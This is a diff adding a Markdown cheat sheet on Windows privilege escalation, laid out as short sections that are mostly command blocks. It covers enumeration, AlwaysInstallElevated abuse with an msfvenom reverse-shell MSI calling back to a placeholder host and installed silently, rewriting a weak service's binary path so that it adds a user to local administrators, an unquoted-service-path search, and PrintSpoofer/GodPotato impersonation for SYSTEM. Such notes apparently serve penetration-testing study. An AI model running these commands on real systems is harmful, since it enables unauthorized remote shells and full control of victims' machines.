@@ -1,0 +1,52 @@
+# Windows Privilege Escalation
+
+## Enumeration
+
+Run winPEAS first for a broad sweep: `whoami /all` tells you what privileges and group memberships your current token has.
+
+```powershell
+.\winPEASx64.exe
+whoami /all
+net user
+net localgroup administrators
+systeminfo
+```
+
+## AlwaysInstallElevated
+
+If both registry keys are set to 1, any user can install MSI packages as SYSTEM: generate a malicious installer and run it quietly.
+
+```bash
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o shell.msi
+msiexec /quiet /qn /i shell.msi
+```
+
+## Unquoted Service Path
+
+A service binary path with spaces and no quotes lets you plant an executable in a parent directory that gets executed instead.
+
+```bash
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
+```
+
+## Weak Service Permissions
+
+If you can reconfigure a service binary path, swap it to a command that adds your user to local admins then restart the service.
+
+```bash
+.\SharpUp.exe audit
+sc config <service> binpath= "cmd /c net localgroup administrators <user> /add"
+sc stop <service> && sc start <service>
+```
+
+## SeImpersonatePrivilege
+
+Common on service accounts: use a potato exploit to impersonate SYSTEM via a coerced local token.
+
+```bash
+whoami /priv
+.\PrintSpoofer64.exe -i -c cmd
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"
+```
